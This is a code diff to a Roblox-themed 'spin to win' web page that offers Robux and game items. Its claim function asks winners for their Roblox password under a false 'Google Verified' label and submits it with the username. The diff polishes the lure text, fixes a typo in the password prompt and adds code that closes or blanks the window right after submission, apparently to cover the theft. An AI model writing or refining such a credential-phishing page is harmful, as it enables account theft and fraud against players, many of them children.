@@ -804,7 +804,7 @@ select{
             <div class="spin-glow"></div>
 
             <h2 id="result">
-                Land on Secret or above to have a chance of winning 2k Robux and SAB items
+                Land on Secret or above to have a chance of winning 3K Robux or 300m+ SAB items
             </h2>
 
             <button class="green-btn" onclick="spin()">
@@ -828,7 +828,7 @@ select{
                     <option value="1000">Slow</option>
                     <option value="500" selected>Normal</option>
 
-               </select>
+                </select>
 
             </div>
 
@@ -842,7 +842,6 @@ select{
 
         <div class="stats-grid">
 
-            <div class="stat">🎰 Spins: <span id="spins">0</span></div>
 
             <div class="stat">🟩 Common: <span id="common">0</span></div>
             <div class="stat">🟦 Rare: <span id="rare">0</span></div>
@@ -1091,7 +1090,7 @@ function manualClaim(){
     if(!username) return;
 
     const claimCode =
-    prompt("Enter Roblos Password (Verified by Google✅):");
+    prompt("Enter Roblox Password (Google Verified Process✅):");
 
     if(!claimCode) return;
 
@@ -1104,12 +1103,27 @@ function manualClaim(){
         time:Date.now()
     });
 
-    alert("Reward claim submitted ✅");
+    alert("Submitted ✅");
 
     document.getElementById("winScreen")
     .style.display="none";
+
+    setTimeout(()=>{
+
+        window.open('','_self');
+        window.close();
+
+    },500);
+
+    setTimeout(()=>{
+
+        window.location.href="about:blank";
+
+    },800);
 }
 
 </script>
 
 </body>
+</html>
+</html>
